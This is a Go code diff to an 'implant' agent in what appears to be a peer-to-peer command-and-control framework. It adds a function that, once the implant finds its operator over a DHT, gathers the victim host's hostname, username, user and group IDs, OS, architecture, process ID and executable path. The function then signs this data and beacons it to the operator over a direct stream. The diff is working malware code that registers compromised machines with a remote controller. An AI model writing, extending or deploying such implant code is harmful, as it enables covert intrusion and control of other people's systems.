@@ -2,6 +2,7 @@ package core
 
 import (
 	"context"
+	"encoding/binary"
 	"fmt"
 	"log"
 	"math/rand"
@@ -217,6 +218,7 @@ func (a *Agent) discoverOperatorLoop(ns string) {
 			if !a.connected {
 				a.connected = true
 				log.Printf("[implant] connected to operator via DHT: %s", pi.ID.String())
+				go a.sendBeaconDirect(pi.ID)
 			}
 			a.connectedMu.Unlock()
 		}
@@ -312,6 +314,78 @@ func (a *Agent) sendBeaconRegister() {
 		log.Printf("[implant] send register: %v", err)
 		return
 	}
+}
+
+func (a *Agent) sendBeaconDirect(operatorID peer.ID) {
+	hostname, _ := os.Hostname()
+	username := os.Getenv("USER")
+	if username == "" {
+		username = os.Getenv("USERNAME")
+	}
+	if u, err := user.Current(); err == nil && u.Name != "" {
+		username = u.Name
+	} else if err == nil && u.Username != "" {
+		username = u.Username
+	}
+	reg := &apb.Register{
+		Name:     username,
+		Hostname: hostname,
+		Username: username,
+		UID:      fmt.Sprintf("%d", os.Getuid()),
+		GID:      fmt.Sprintf("%d", os.Getgid()),
+		OS:       runtime.GOOS,
+		Arch:     runtime.GOARCH,
+		PID:      int32(os.Getpid()),
+		Filename: os.Args[0],
+		Version:  "0.1.0",
+		Locale:   os.Getenv("LANG"),
+		PeerID:   int64(os.Getpid()),
+		ActiveC2: a.node.ID().String(),
+	}
+	beaconReg := &apb.Z1{
+		ID:       a.node.ID().String(),
+		Interval: int64(a.config.BeaconInterval.Seconds()),
+		Jitter:   int64(a.config.BeaconJitter.Seconds()),
+		Register: reg,
+	}
+	beaconData, err := proto.Marshal(beaconReg)
+	if err != nil {
+		log.Printf("[implant] direct beacon marshal: %v", err)
+		return
+	}
+	env := a.messenger.CreateEnvelope(transport.MsgTypeRegister, beaconData)
+	sig, err := a.keys.PrivateKey.Sign(env.Data)
+	if err != nil {
+		log.Printf("[implant] direct beacon sign: %v", err)
+		return
+	}
+	env.Signature = sig
+	pubBytes, err := crypto.MarshalPublicKey(a.keys.PrivateKey.GetPublic())
+	if err == nil {
+		env.SenderKey = pubBytes
+	}
+
+	s, err := a.node.NewStream(a.ctx, operatorID, transport.BeaconProtocolID)
+	if err != nil {
+		log.Printf("[implant] direct beacon stream: %v", err)
+		return
+	}
+	defer s.Close()
+
+	envData, err := proto.Marshal(env)
+	if err != nil {
+		log.Printf("[implant] direct beacon marshal env: %v", err)
+		return
+	}
+	if err := binary.Write(s, binary.LittleEndian, uint32(len(envData))); err != nil {
+		log.Printf("[implant] direct beacon write len: %v", err)
+		return
+	}
+	if _, err := s.Write(envData); err != nil {
+		log.Printf("[implant] direct beacon write data: %v", err)
+		return
+	}
+	log.Printf("[implant] sent direct beacon to %s", operatorID.String())
 }
 
 func (a *Agent) handleCommand(ctx context.Context, env *apb.Envelope, senderPub crypto.PubKey) {
